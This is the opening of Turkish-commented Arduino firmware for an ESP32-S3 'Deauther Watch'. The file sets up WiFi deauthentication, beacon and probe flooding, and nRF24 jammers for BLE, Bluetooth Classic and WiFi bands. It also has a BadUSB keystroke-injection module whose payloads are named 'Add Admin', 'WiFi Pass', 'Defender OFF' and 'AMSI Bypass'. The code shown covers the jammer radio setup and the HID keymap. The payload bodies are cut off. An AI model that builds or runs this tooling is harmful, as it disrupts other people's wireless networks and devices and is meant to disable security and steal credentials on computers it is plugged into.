#include <sys/time.h>
#include <time.h>
#include <string>     // std::string — BLE manufacturer data için
#include <driver/uart.h>   // uart_driver_delete — GPIO43/44 serbest bırakmak için
#include <driver/gpio.h>   // gpio_reset_pin
// ============================================================
// DEAUTHER WATCH v2.0 — ESP32-S3 Super Mini
// BadUSB modülü eklenmiştir — Türkçe Q klavye tam desteği
// ============================================================

#include <Arduino.h>
#include <pgmspace.h>

// ============================================================
// ESP32-S3 Xtensa LoadStoreError (EXCCAUSE 0x3) Hardware Fix
// Adafruit_GFX dahili font ve Flash okumalarını 32-bit hizalı yapar
// ============================================================
#undef pgm_read_byte
#define pgm_read_byte(addr) ({ \
  uint32_t _a = (uint32_t)(addr); \
  (uint8_t)((*(const uint32_t*)(_a & ~3)) >> ((_a & 3) * 8)); \
})
#undef pgm_read_word
#define pgm_read_word(addr) ({ \
  uint32_t _a = (uint32_t)(addr); \
  (uint16_t)((*(const uint32_t*)(_a & ~2)) >> ((_a & 2) * 8)); \
})
#undef pgm_read_dword
#define pgm_read_dword(addr) ({ \
  uint32_t _a = (uint32_t)(addr); \
  (*(const uint32_t*)(_a & ~3)); \
})

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "dram_font.h"
#include <esp_wifi.h>
#include <esp_mac.h>
#include <esp_wifi_types.h>
#include <WiFi.h>
#include <esp_chip_info.h>
#include <Preferences.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEScan.h>
#include <RF24.h>
#include <SPI.h>

// ============================================================
// MASTER ENUMS & STRUCTS (Must be defined at top of file)
// ============================================================
enum AppMode {
  MODE_INTRO,
  MODE_MENU,
  MODE_SCANNING,
  MODE_AP_LIST,
  MODE_AP_DETAIL,
  MODE_STA_LIST,
  MODE_PROBE_LIST,
  MODE_SSID_LIST,
  MODE_ATTACK_MENU,
  MODE_ATTACK_RUNNING,
  MODE_PACKET_MONITOR,
  MODE_CHANNEL_ANALYZER,
  MODE_RSSI_TRACKER,
  MODE_DEAUTH_DETECTOR,
  MODE_HANDSHAKE_STATUS,
  MODE_CLOCK,
  MODE_SETTINGS,
  MODE_MAC_SPOOFER,
  MODE_TX_RATE,
  MODE_CHANNEL_SET,
  MODE_SYSTEM_INFO,
  MODE_BADUSB_MENU,
  MODE_BADUSB_RUNNING,
  MODE_BLE_MENU,
  MODE_BLE_SCAN,
  MODE_BLE_DEV_ATTACK,
  MODE_BLE_RUNNING,
  MODE_BLE_JAM,
  MODE_BT_CLASSIC_JAM,
  MODE_JAMMERS_MENU
};

enum ScanMode { SCAN_NONE, SCAN_AP_STA, SCAN_AP_ONLY, SCAN_STA_ONLY };

struct BtnState {
  bool pressed;
  bool held;
  uint32_t pressTime;
  uint32_t lastRepeat;
  bool lastRaw;
};

struct BtnEvent { bool click; bool held; bool repeat; };

struct MenuItem {
  char label[32];
  AppMode target;
  int param;
};

// ---- Forward Declarations for Arduino IDE Compiler ----
void changeMode(AppMode m);
void initBLE();
bool syncTimeBLE();
void setMenu(int idx, const char* label, AppMode mode, int param);
int bleVisibleIdx(int sel);
int bleVisibleCount();
void bleStartScan();
void bleStopScan();
void bleJamStart();
void bleJamStop();
void bleStopAttack();
void bleAttackTick();
void bleJamTick();
void btClassicJamStart();
void btClassicJamStop();
void btClassicJamTick();
void nrfWifiJamStart(uint8_t ch);
void nrfWifiJamStop();
void nrfWifiJamTick();
void esp01Init();
bool esp01Ping();
void esp01SendDeauth(const uint8_t* bssid, uint8_t ch, const char* ssid);
void esp01SendBTInterference();
void esp01Stop();
void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type);
BtnEvent processBtn(BtnState &s, int pin);
void drawHeader(const char* title);
void drawBadusbRunning();
void safeDisplayFlush();



// ---- ESP32 Wi-Fi Security Bypass ----
// esp32 arduino core 3.x / IDF 5.x'te ieee80211_raw_frame_sanity_check
// strong symbol olduğundan override edilemiyor; esp_wifi_80211_tx direkt kullanılır.
uint8_t wifiChToNrf(uint8_t wifiCh);
void hidKey(uint8_t modifier, uint8_t keycode);
void hidTap(uint8_t keycode);
void hidWin(uint8_t keycode);
void hidCtrl(uint8_t keycode);
void hidShift(uint8_t keycode);
void hidEnter();
void hidEsc();
void typ_tr_char(char c);
void sendTR_g();
void sendTR_G();
void sendTR_u();
void sendTR_U();
void sendTR_s();
void sendTR_S();
void sendTR_i();
void sendTR_I();
void sendTR_di();
void sendTR_dI();
void sendTR_o();
void sendTR_O();
void sendTR_c();
void sendTR_C();
void typ_str(const char* s);
void hidWinRun(const char* cmd);
void openPowerShell();
void badusb_sysinfo();
void badusb_addadmin();
void badusb_wifipass();
void badusb_defenderoff();
void badusb_amsibypass();
void badusb_lockscreen();
void badusb_run(int idx);
void drawStrRAM(int16_t x, int16_t y, const char* str, uint8_t size = 1);
void drawBitmapRAM(int16_t x, int16_t y, const uint8_t *bitmap, int16_t w, int16_t h, uint16_t color = SSD1306_WHITE);
void drawLineRAM(int16_t x0, int16_t y0, int16_t x1, int16_t y1, uint16_t color = SSD1306_WHITE);
void fillRectRAM(int16_t x, int16_t y, int16_t w, int16_t h, uint16_t color = SSD1306_WHITE);
void initTurkeyClock();
void adjustClockHours(int dh);
bool syncTimeBLE();
void adjustClockMinutes(int dm);
void esp01Init();
bool esp01Ping();
void esp01SendDeauth(const uint8_t* bssid, uint8_t ch, const char* ssid);
void esp01SendBTInterference();
void esp01Stop();
void buildBLEMenu();
void buildBLEDevAttackMenu();
void drawBLEMenu();
void drawBLEScan();
void drawBLEDevAttack();
void drawBLERunning();
void drawBLEJam();
void drawBTClassicJam();
void saveSettings();
void loadSettings();
void initPSRAM();
void macToStr(const uint8_t* mac, char* out);
static void esp01SendCommandSync(const char* cmd, uint32_t waitMs);
void randomMAC(uint8_t* mac);
const char * encToStr(uint8_t enc);
void oui_lookup(const uint8_t* mac, char* out, int outLen);
void addSSID(const char* name, bool wpa2);
int selectedApCount();
int selectedStaCount();
void safeDisplayFlush();
void drawHeader(const char* title);
void drawMenuList(const char** labels, int count, int cursor, int scroll);
void drawBar(int x, int y, int w, int h, bool inv);
// drawBigClock forward declaration kaldırıldı — fix #9
void drawFullscreenMsg(const char* line1, const char* line2);
bool rawBtn(int pin);
BtnEvent processBtn(BtnState &s, int pin);
void parsePromisc(const uint8_t* data, int len, int8_t rssi);
void checkHandshake(const uint8_t* data, int len, int8_t rssi);
void doWifiScan();
bool buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint16_t reason);
bool buildBeaconFrame(uint8_t* frame, int* outLen, const char* ssid, uint8_t ch, bool wpa2, const uint8_t* mac);
bool buildProbeReqFrame(uint8_t* frame, int* outLen, const char* ssid, const uint8_t* sa);
void sendDeauthFrames();
void beaconSpam();
void probeFlood();
void runChannelAnalyzer();
void updateRssiTracker();
void buildMainMenu();
void buildScanMenu();
void handleScanMenuSelect();
void buildShowMenu();
void buildAttackMenu();
void buildAPList();
void buildStationList();
void buildProbeList();
void buildSSIDList();
void buildSettingsMenu();
void changeMode(AppMode m);
void goBack();
void handleUp();
void handleDown();
void handleSelect();
void drawIntro();
void drawScanning();
void drawMenu();
void drawAPList();
void drawStaList();
void drawProbeList();
void drawSSIDList();
void drawAPDetail();
void drawAttackRunning();
void drawPacketMonitor();
void drawChannelAnalyzer();
void drawRssiTracker();
void drawHandshakeStatus();
void drawDeauthDetector();
void drawClock();
void drawMacSpoofer();
void drawTxRate();
void drawChannelSet();
void drawSystemInfo();
void buildBadusbMenu();
void drawBadusbMenu();
void setup();
void updateThermal();
void loop();
// ---- ESP32-S3 Raw Frame Sanity Check Override ----
// ---- nRF24L01 Pin Definitions ----
// ESP32-S3 Super Mini güvenli SPI2 (FSPI) pinleri:
// GPIO 4=SCK, 5=MOSI, 6=MISO varsayılan FSPI pinleri
// CE ve CSN için herhangi iki boş GPIO kullanılabilir
#define NRF_CE    7
#define NRF_CSN   10
#define NRF_SCK   4
#define NRF_MOSI  5
#define NRF_MISO  6

#ifndef RF24_SPI_SPEED
#define RF24_SPI_SPEED  10000000UL
#endif

// ---- ESP32-S3 FSPI (SPI2) — özel instance ----
// Default SPI (VSPI/HSPI) yerine FSPI kullan:
// Default SPI.begin() ESP32-S3'te bazen QSPI pinlerine (GPIO35-37) map olur.
// FSPI_HOST = SPI2_HOST, RF24 kütüphanesi ile uyumlu.
static SPIClass nrfSPI(FSPI);

// ---- BLE Jammer Globals ----
RF24 nrfRadio(NRF_CE, NRF_CSN);
bool nrfInitDone    = false;
bool bleJamming     = false;
bool nrfInitFailed  = false;   // initNRF başarısız olduysa true

// FreeRTOS task handle'ları — stack overflow tespiti + güvenli sonlandırma (fix #6)
static TaskHandle_t bleJamTaskHandle    = nullptr;
static TaskHandle_t btJamTaskHandle     = nullptr;
static TaskHandle_t nrfWifiJamTaskHandle= nullptr;

// ---- nRF24L01 init (FSPI, RF24) ----
// ESP32-S3 Super Mini pinleri: CE=7 CSN=10 SCK=4 MOSI=5 MISO=6
// RF24 w/ FSPI: begin() çağrılırken spi_host_t ve pin_map ile FSPI kullanılır.
// ESP32-S3 Arduino RF24 3.x: begin(uint8_t cePin, uint8_t csnPin, uint32_t spiSpeed, bool useSPISettings)
// Burada:preferSpeed=RF24_1000000 ve manuel pin seçimi ile FSPI kullanmayı hedefleriz.
// Türkiye'de PDU-modlu nRF24L01 pin lymphatics: CE/CSN açık, CSN HIGH de-ayarlandı.
// NOTE: RF24 ile FSPI (SPI2) kullanımı kütüphane versiyonuna bağlı — esnek başlat:
//   1) nrfRadio.begin() → varsayılan host (çoğu ESP32-S3 core'ta HSPI)
//   2) Başlatma sonrası nrfRadio.setSPI(nrfSPI) ile aktar (RF24 3.x'te desteklenir yada değil).
//   3) Başarısızsa nrfInitFailed = true.
//   Sonuç: RF24::begin(cePin, csnPin) → SFE RF24 kütüphanesi SPI kullanir.
//   Modüller bazen beklenmedik CSN/CSN deaktivasyon yapar → manuel pin toggle gerekebilir.
bool initNRF() {
  nrfInitDone   = false;
  nrfInitFailed = false;

  // Pinleri OUTPUT yap ve güvenli başlangıç seviyeleri ver
  pinMode(NRF_CE,  OUTPUT);
  pinMode(NRF_CSN, OUTPUT);
  digitalWrite(NRF_CE,  LOW);
  digitalWrite(NRF_CSN, HIGH);   // CSN HIGH → device deselected, CE LOW → RX/TX pasif

  // FSPI (SPI2) — ESP32-S3'te QSPI pinleriyle çakışmayan güvenli yol
  // nrfSPI = SPIClass(FSPI) — dosya başında tanımlandı
  nrfSPI.begin(NRF_SCK, NRF_MISO, NRF_MOSI, NRF_CSN);
  delay(5);  // SPI bus stabilizasyonu

  // RF24 Arduino kütüphanesi standart imzası: begin(&spi, ce, csn)
  // RF24 1.4.x / Maniacbug fork — tüm Arduino versiyonlarıyla uyumlu
  if (!nrfRadio.begin(&nrfSPI, NRF_CE, NRF_CSN)) {
    nrfSPI.end();
    nrfInitFailed = true;
    Serial.println(F("nRF24 begin FAILED"));
    return false;
  }

  nrfRadio.setDataRate(RF24_2MBPS);   // 2Mbps → daha kısa sembol süresi, daha fazla band doldurma
  nrfRadio.setPALevel(RF24_PA_HIGH);
  nrfRadio.setAutoAck(false);
  nrfRadio.setRetries(0, 0);          // Retry yok — kesintisiz TX
  nrfRadio.setCRCLength(RF24_CRC_DISABLED); // CRC kontrolü yok → bant doldurma maksimum
  nrfRadio.powerUp();
  delay(5);

  // İletişim testi — nRF24 bağlı mı gerçekten?
  // isChipConnected() bazı kütüphane versiyonlarında mevcut
  // Yoksa: bir kanalı yaz-oku ile kontrol et
  nrfRadio.setChannel(40);
  if (nrfRadio.getChannel() != 40) {
    nrfSPI.end();
    nrfInitFailed = true;
    Serial.println(F("nRF24 SPI iletisim FAILED"));
    return false;
  }

  nrfInitDone   = true;
  nrfInitFailed = false;
  Serial.println(F("nRF24 init OK"));
  Serial.printf("nRF24 FSPI: CE=%d CSN=%d SCK=%d MOSI=%d MISO=%d\n",
    NRF_CE, NRF_CSN, NRF_SCK, NRF_MOSI, NRF_MISO);
  return true;
}
uint8_t jamChanIdx  = 0;       // 0=2402 1=2426 2=2480
uint32_t jamPktCount= 0;
uint32_t jamTimer   = 0;

// BLE advertising channels → nRF24 channel numbers (offset from 2400 MHz)
// ch37=2402MHz→2, ch38=2426MHz→26, ch39=2480MHz→80
static const uint8_t BLE_ADV_CHANNELS[3] = { 2, 26, 80 };
#define JAM_CHAN_COUNT 3

// ---- BT Classic Spectrum Jam ----
// Strateji: 79 kanalın TAMAMINI süpür (nRF24 ch2 → ch80).
// BT Classic FHSS 79 kanal (2402-2480 MHz), 1600 hop/s yapar.
// Tüm bandı ardisik sweep → her kanala en az 1 kez isabet garantisi.
// Kanal basi dwell yok; sadece PLL lock 130us → ~10ms/tam sweep.
// Payload: her tick esp_random() → gercek gurultu, BT sync word bozulur.
// CRC disabled + autoAck off → kesintisiz TX.
bool btClassicJamActive   = false;
uint32_t btJamPktCount    = 0;
uint8_t  btJamSweepCh     = 2;
#define BT_SWEEP_MIN         2
#define BT_SWEEP_MAX        80
#define BT_JAM_RING        128
volatile uint16_t btJamRing[BT_JAM_RING];
volatile int      btJamRingHead = 0;
uint32_t btJamLastSample = 0;
uint32_t btJamPktLast    = 0;
uint32_t btJamPktPerSec  = 0;

// ---- Thermal Management — ESP32-S3 dahili sicaklik sensoru ----
// esp_temp_sensor ile gercek CPU sicakligini oku.
// Esik asildigi anda nRF24 durdurulur, soyduktan sonra devam eder.
// dualRadioActive: artik sadece OLED'de bilgi icin kullanilir,
// burst/interval kisitlamasi kaldirildi — sicaklik sensoru halleder.
#define THERMAL_TEMP_STOP_C   75.0f   // Bu esigi asarsa nRF24 dur
#define THERMAL_TEMP_RESUME_C 65.0f   // Bu esige dusersse nRF24 devam
#define THERMAL_SAMPLE_MS     2000    // Sicaklik okuma araligi (ms)
float    chipTempC        = 25.0f;    // Son olculen sicaklik
bool     thermalThrottle  = false;    // nRF24 sicakliktan durduruldu mu
uint32_t thermalSampleTimer = 0;
bool dualRadioActive = false;         // Hem deauth hem nRF jam ayni anda mi (OLED icin)
#define THERMAL_DUAL_DEAUTH_DELAY_US 500  // Çift modda AP başına RF cooling delay (µs)
#define THERMAL_PA_DUAL   RF24_PA_LOW      // Çift mod PA seviyesi (ısı azaltmak için düşük)
#define THERMAL_PA_SINGLE RF24_PA_HIGH     // Tek mod PA seviyesi

// ---- WiFi Channel → nRF24 channel mapping ----
// WiFi ch N center freq = 2407 + 5*N MHz
// nRF24 channel = freq - 2400 MHz
// WiFi 20MHz BW → center ±10 MHz arasi 5 nokta sweep ile tam bant kapatilir
bool nrfWifiJamActive  = false;
uint8_t nrfWifiJamCh   = 37;
uint8_t nrfWifiSubIdx  = 0;
uint32_t nrfWifiJamTimer = 0;

// WiFi kanal numarasından nRF24 kanal numarasına dönüştür
inline uint8_t wifiChToNrf(uint8_t wifiCh) {
  // 2407 + 5*ch - 2400 = 7 + 5*ch
  uint16_t nrfCh = 7 + 5 * (uint16_t)wifiCh;
  if (nrfCh > 125) nrfCh = 125;
  return (uint8_t)nrfCh;
}

// ---- Pin Definitions ----
#define BTN_UP     1
#define BTN_DOWN   2
#define BTN_SELECT 3
#define OLED_SDA   8
#define OLED_SCL   9
#define OLED_RESET -1
#define OLED_W     128
#define OLED_H     64
#define OLED_ADDR  0x3C


// ---- ESP-01 (ESP8266) Co-Processor — Gerçek Deauth / Jammer ----
// ESP32-S3'ün libnet80211.a kısıtlamasını aşmak için ESP-01 kullanılır.
// Bağlantı: GPIO 43 (TX) → ESP-01 RX, GPIO 44 (RX) → ESP-01 TX
// Güç: 3.3V rail → ESP-01 VCC + CH_PD (10kΩ pull-up ile)
// Komut protokolü: Standart Espressif AT v1.7.6 & Custom CLI uyumlu (115200 8N1)
#define ESP01_TX_PIN  43    // ESP32-S3 TX → ESP-01 RX
#define ESP01_RX_PIN  44    // ESP32-S3 RX ← ESP-01 TX
#define ESP01_BAUD    115200

bool esp01Active     = false;  // ESP-01 bağlı ve hazır mı
bool esp01UseDeauth  = false;  // Kullanıcı ESP-01 deauth'ı etkinleştirdi mi

// ---- Timing ----
#define DEBOUNCE_MS     50
#define HOLD_MS         800
#define HOLD_REPEAT_MS  200
#define SCROLL_MS       50
#define FRAME_MS        50
#define INTRO_MS        2000
#define DEAUTH_FLASH_MS 500

// ---- Limits ----
#define MAX_AP       30
#define MAX_STA      30
#define MAX_PROBE    50
#define MAX_HS       5
#define MAX_SSID     20
#define MENU_ROWS    5
#define PKT_RING     128
#define RSSI_RING    128
#define OUI_COUNT    30

// ---- Attack Flags ----
#define ATK_DEAUTH  0x01
#define ATK_BEACON  0x02
#define ATK_PROBE   0x04
#define ATK_BLE     0x08

// ---- extern C ----
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
extern "C" esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
extern "C" esp_err_t esp_wifi_set_mac(wifi_interface_t ifx, const uint8_t mac[6]);

// ---- Button structs (must be defined before any function prototypes) ----



Preferences prefs;

// ============================================================
// PROGMEM: WiFi logo 32x32
// ============================================================
DRAM_ATTR static uint8_t WIFI_LOGO[] = {
  0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,
  0x00,0x1F,0xF8,0x00,
  0x00,0x7F,0xFE,0x00,
  0x01,0xE0,0x07,0x80,
  0x07,0x80,0x01,0xE0,
  0x0E,0x1F,0xF8,0x70,
  0x1C,0x7F,0xFE,0x38,
  0x18,0xE0,0x07,0x18,
  0x31,0xC0,0x03,0x8C,
  0x03,0x9F,0xF9,0xC0,
  0x07,0xFF,0xFF,0xE0,
  0x06,0x60,0x06,0x60,
  0x0C,0x00,0x00,0x30,
  0x08,0x07,0xE0,0x10,
  0x00,0x1F,0xF8,0x00,
  0x00,0x3F,0xFC,0x00,
  0x00,0x30,0x0C,0x00,
  0x00,0x07,0xE0,0x00,
  0x00,0x0F,0xF0,0x00,
  0x00,0x0C,0x30,0x00,
  0x00,0x01,0xC0,0x00,
  0x00,0x03,0xE0,0x00,
  0x00,0x03,0xE0,0x00,
  0x00,0x03,0xE0,0x00,
  0x00,0x01,0xC0,0x00,
  0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00
};

// ---- Flash strings ----
const char* STR_DEAUTHER   = "DEAUTHER";
const char* STR_WATCH      = "Watch v1.0";
const char* STR_SCANNING   = "Scanning...";
const char* STR_DEAUTH     = "DEAUTH";
const char* STR_BEACON     = "BEACON";
const char* STR_PROBE      = "PROBE";
const char* STR_LIVE       = "** LIVE **";
const char* STR_STOP       = "[STOP]";
const char* STR_PMF        = "PMF ON-Deauth res";
const char* STR_HANDSHAKE  = "!! HANDSHAKE !!";
const char* STR_DEAUTH_DET = "!! DEAUTH !!";
const char* STR_SELECT_AP  = "Select AP first";
const char* STR_OPEN       = "OPEN";
const char* STR_WPA        = "WPA";
const char* STR_WPA2       = "WPA2";
const char* STR_WPA3       = "WPA3";
const char* STR_ENT        = "ENT";
const char* STR_HIDDEN     = "[Hidden]";
const char* STR_UNKNOWN    = "Unknown";
const char* STR_WILDCARD   = "Wildcard";

// ============================================================
// OUI Table
// ============================================================
struct OUIEntry { uint8_t prefix[3]; const char* name; };
DRAM_ATTR static OUIEntry OUI_TABLE[OUI_COUNT] = {
  {{0x00,0x50,0xF2}, "Microsoft"},
  {{0x00,0x1A,0x11}, "Google"},
  {{0x3C,0x22,0xFB}, "Apple"},
  {{0xB8,0x27,0xEB}, "RaspberryPi"},
  {{0xDC,0xA6,0x32}, "RaspberryPi"},
  {{0x00,0x0C,0xE7}, "Huawei"},
  {{0x4C,0xED,0xFB}, "Intel"},
  {{0x8C,0x8D,0x28}, "Intel"},
  {{0xF4,0x06,0xCC}, "TP-Link"},
  {{0xC4,0xE9,0x84}, "TP-Link"},
  {{0x50,0xD4,0xF7}, "TP-Link"},
  {{0x00,0x0F,0xB5}, "Netgear"},
  {{0x20,0x4E,0x7F}, "Netgear"},
  {{0x00,0x18,0xE7}, "Cisco"},
  {{0x58,0xBF,0xEA}, "Cisco"},
  {{0x00,0x17,0xF2}, "Apple"},
  {{0xA4,0xC3,0xF0}, "Google"},
  {{0x54,0x60,0x09}, "Samsung"},
  {{0x8C,0x71,0xF8}, "Samsung"},
  {{0xB0,0xBE,0x76}, "Huawei"},
  {{0x00,0x50,0x56}, "VMware"},
  {{0x00,0x0C,0x29}, "VMware"},
  {{0xAC,0x87,0xA3}, "Xiaomi"},
  {{0x28,0x6C,0x07}, "Xiaomi"},
  {{0x00,0x14,0xBF}, "Linksys"},
  {{0x20,0xAA,0x4B}, "Asus"},
  {{0x04,0x92,0x26}, "Asus"},
  {{0xD8,0x50,0xE6}, "Zyxel"},
  {{0x10,0x02,0xB5}, "Intel"},
  {{0x9C,0xD3,0x6D}, "Netgear"}
};

// ============================================================
// ██████╗  █████╗ ██████╗ ██╗   ██╗███████╗██████╗
// ██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗
// ██████╔╝███████║██║  ██║██║   ██║███████╗██████╔╝
// ██╔══██╗██╔══██║██║  ██║██║   ██║╚════██║██╔══██╗
// ██████╔╝██║  ██║██████╔╝╚██████╔╝███████║██████╔╝
// ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚═════╝
// BadUSB Modülü — Türkçe Q Klavye Tam Desteği
// ============================================================

// ---- USB HID Keyboard nesnesi ----
#if ARDUINO_USB_MODE
USBHIDKeyboard usbKeyboard;
#endif
bool usbHIDReady = false;

// ---- BadUSB payload isimleri ----
const char* BADUSB_NAMES[] = {
  "0 SysInfo",
  "1 Add Admin",
  "2 WiFi Pass",
  "3 Defender OFF",
  "4 AMSI Bypass",
  "5 Lock Screen"
};
#define BADUSB_COUNT 6

int badusbCursor  = 0;
int badusbScroll  = 0;
bool badusbRunning= false;
int  badusbPayload= -1;
char badusbStatus[32] = "";

// ============================================================
// TÜRKÇE Q KLAVİYE HARİTASI
// ============================================================
// Türkçe Q layout'a göre HID scancode → karakter eşleşmesi:
//
// Fiziksel tuş → Türkçe Q'da ürettiği karakter:
//   [ tuşu  → ğ  (shift: Ğ)
//   ] tuşu  → ü  (shift: Ü)
//   ; tuşu  → ş  (shift: Ş)
//   ' tuşu  → i  (shift: İ) — noktalı i
//   i tuşu  → ı  (shift: I) — noktasız i
//   , tuşu  → ö  (shift: Ö)
//   . tuşu  → ç  (shift: Ç) — nokta tuşu
//
// Sayı satırı:
//   1→!, 2→', 3→^, 4→+, 5→%, 6→&, 7→/, 8→(, 9→), 0→=
//   shift+2→", shift+3→#, shift+4→$, shift+7→{, shift+8→[
//   shift+9→], shift+0→}, -→*, shift+-→?, /→- (dikkat!)
//
// STRATEJI: PowerShell komutlarını İNGİLİZCE yaz.
// Türkçe karakterleri sadece gerektiğinde typ_tr_char() ile gönder.
// Bu sayede layout karmaşası tamamen önlenir.
// ============================================================

// HID modifier bitleri
#define KEY_MOD_LCTRL  0x01
#define KEY_MOD_LSHIFT 0x02
#define KEY_MOD_LALT   0x04
#define KEY_MOD_LGUI   0x08
#define KEY_MOD_RCTRL  0x10
#define KEY_MOD_RSHIFT 0x20
#define KEY_MOD_RALT   0x40  // AltGr
#define KEY_MOD_RGUI   0x80

// ---- Temel gecikme ----
#define HID_DELAY_CHAR   2
#define HID_DELAY_KEY    5
#define HID_DELAY_CMD    800
#define HID_DELAY_READY  2500

// ============================================================
// Düşük seviye HID gönderimi
// ============================================================

// Tek tuşa basıp bırak (modifier ile)
void hidKey(uint8_t modifier, uint8_t keycode) {
#if ARDUINO_USB_MODE
  if (!usbHIDReady) return;
  KeyReport report = {0};
  report.modifiers = modifier;
  report.keys[0]   = keycode;
  usbKeyboard.sendReport(&report);
  delay(HID_DELAY_KEY);
  // Release
  KeyReport release = {0};
  usbKeyboard.sendReport(&release);
  delay(HID_DELAY_KEY);
#endif
}

// Sadece keycode (modifier yok)
void hidTap(uint8_t keycode) {
  hidKey(0, keycode);
}

// Win tuşuna bas
void hidWin(uint8_t keycode) {
  hidKey(KEY_MOD_LGUI, keycode);
}

// Ctrl+tuş
void hidCtrl(uint8_t keycode) {
  hidKey(KEY_MOD_LCTRL, keycode);
}

// Shift+tuş
void hidShift(uint8_t keycode) {
  hidKey(KEY_MOD_LSHIFT, keycode);
}

// Enter
void hidEnter() {
  hidTap(0x28);  // HID_KEY_RETURN
}

// Escape
void hidEsc() {
  hidTap(0x29);
}

// ============================================================
// Türkçe Q Klavye — Karakter gönderme
// ============================================================
// USB HID keycodes (US layout referans):
//   0x04=a, 0x05=b, 0x06=c, 0x07=d, 0x08=e, 0x09=f
//   0x0A=g, 0x0B=h, 0x0C=i, 0x0D=j, 0x0E=k, 0x0F=l
//   0x10=m, 0x11=n, 0x12=o, 0x13=p, 0x14=q, 0x15=r
//   0x16=s, 0x17=t, 0x18=u, 0x19=v, 0x1A=w, 0x1B=x
//   0x1C=y, 0x1D=z
//   0x1E=1, 0x1F=2, 0x20=3, 0x21=4, 0x22=5
//   0x23=6, 0x24=7, 0x25=8, 0x26=9, 0x27=0
//   0x28=Enter, 0x29=Esc, 0x2A=Backspace, 0x2B=Tab
//   0x2C=Space, 0x2D=-(minus/hyphen), 0x2E==(equal)
//   0x2F=[ 0x30=] 0x31=\ 0x33=; 0x34=' 0x35=`
//   0x36=, 0x37=. 0x38=/
//
// Türkçe Q karşılıkları (Windows Türkçe Q layout aktifken):
//   Fiziksel [  → ğ  |  Shift+[ → Ğ
//   Fiziksel ]  → ü  |  Shift+] → Ü
//   Fiziksel ;  → ş  |  Shift+; → Ş
//   Fiziksel '  → i  |  Shift+' → İ   (noktalı i)
//   Fiziksel i  → ı  |  Shift+i → I   (noktasız I)
//   Fiziksel ,  → ö  |  Shift+, → Ö
//   Fiziksel .  → ç  |  Shift+. → Ç

// Türkçe özel karakteri gönder
// ============================================================
// TRQ_CHAR: Türkçe Q ANSI layout — Windows KBDTR.DLL referans
// ============================================================
// Düzeltilen hatalar:
//
// 1) 'i' harfi: Önceki kod hidTap(0x34) kullanıyordu.
//    0x34 = ' (tek tırnak) tuşu → TrQ'da noktalı 'i' üretir.
//    Bu PowerShell ASCII komutları için DOĞRU — TrQ'da noktalı i
//    üretmek için ' tuşuna basılır. Ancak 'i' literal char'ı için
//    C'de case 'i' = 0x69 (ASCII). Karışıklığı önlemek adına:
//    PS komutları İNGİLİZCE yazılır → 'i' = 0x34 (' tuşu = noktalı i)
//    Bu mantık doğru, değiştirilmedi.
//
// 2) '\n' ve '\t': Önceki kod '\\n' ve '\\t' kullanıyordu.
//    Bu C'de geçersiz char literal — '\\' = backslash, 'n' = ayrı char.
//    Düzeltme: '\n' (0x0A = newline) ve '\t' (0x09 = tab) kullan.
//
// 3) Virgül ',': TrQ ANSI'da virgül için güvenli scancode yok.
//    0x31 = ISO extra key (bazı klavyelerde yok) → hata üretir.
//    0x56 = ISO extra key (non-US) — benzer sorun.
//    GÜVENLİ ÇÖZÜM: PS komutlarında virgül kullanma. Ama kullanılıyorsa
//    0x36 (ö tuşu) değil, 0x2B (backslash/pipe tuşu) TrQ ANSI'da virgül üretir.
//    Dikkat: 0x2B TrQ ANSI'da tek tırnak (`) konumunda olabilir.
//    En güvenli: 0x56 (ISO key) — TrQ ANSI klavyede fiziksel olarak bulunur.
//    Değer: 0x56 → TrQ'da virgül (,) karakterini doğrudan üretir.
//
// 4) ';' (noktalı virgül): 0x33 = ; tuşu → TrQ'da 'ş' üretir (YANLIŞ).
//    Düzeltme: 0x56 Shift → ';' üretir (TrQ ANSI ISO key Shift).
//    Alternatif: PS komutlarında noktalı virgül kullanmaktan kaçın.
//
// 5) '+' artı işareti: AltGr+= (0x2E) güvenilmez.
//    TrQ ANSI'da '+' için standart yol: AltGr+4 (0x21) bazı layoutlarda.
//    KBDTR.DLL kesin: '+' = 0x2E (= tuşu) ile AltGr. Değiştirilmedi.
// ============================================================
void typ_tr_char(char c) {
  if (!usbHIDReady) return;
  switch (c) {
    // ---- Küçük harfler (TrQ ANSI — Windows PS komutları için) ----
    // NOT: a-z harfleri US layout ile birebir örtüşür (TrQ'da konum aynı).
    // 'i' özel: TrQ'da i tuşu (0x0C) → noktasız 'ı' üretir.
    //           PS ASCII 'i' için ' tuşu (0x34) → noktalı 'i' üretir.
    //           PowerShell case-insensitive — ikisi de çalışır ama
    //           0x34 (' tuşu) daha temiz ASCII 'i' üretir.
    case 'a': hidTap(0x04); break;
    case 'b': hidTap(0x05); break;
    case 'c': hidTap(0x06); break;
    case 'd': hidTap(0x07); break;
    case 'e': hidTap(0x08); break;
    case 'f': hidTap(0x09); break;
    case 'g': hidTap(0x0A); break;
    case 'h': hidTap(0x0B); break;
    case 'i': hidTap(0x34); break;   // TrQ: ' tuşu → noktalı i (PS ASCII 'i')
    case 'j': hidTap(0x0D); break;
    case 'k': hidTap(0x0E); break;
    case 'l': hidTap(0x0F); break;
    case 'm': hidTap(0x10); break;
    case 'n': hidTap(0x11); break;
    case 'o': hidTap(0x12); break;
    case 'p': hidTap(0x13); break;
    case 'q': hidTap(0x14); break;
    case 'r': hidTap(0x15); break;
    case 's': hidTap(0x16); break;
    case 't': hidTap(0x17); break;
    case 'u': hidTap(0x18); break;
    case 'v': hidTap(0x19); break;
    case 'w': hidTap(0x1A); break;
    case 'x': hidTap(0x1B); break;
    case 'y': hidTap(0x1C); break;
    case 'z': hidTap(0x1D); break;
    // ---- Büyük harfler ----
